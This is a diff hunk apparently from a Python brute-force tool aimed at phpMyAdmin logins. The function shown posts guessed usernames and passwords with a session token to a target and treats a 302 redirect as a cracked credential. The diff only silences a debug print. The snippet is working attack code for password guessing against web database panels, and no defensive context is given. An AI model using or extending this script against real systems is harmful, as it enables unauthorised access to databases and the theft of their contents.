@@ -18,7 +18,7 @@ def getpassword(user, password):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
     post_data={"set_session":tmp_session,"pma_username":user,"pma_password":password,"server":"1","target":"index.php","token":tmp_token}
     res2 = session.post(url=Target,data=post_data,headers=headers,allow_redirects=False,verify=False)
-    print(res2.text)
+    #print(res2.text)
     if res2.status_code == 302:
         print("Find PASSWORD!!!!!!:"+user+":"+password)
         flag = 1
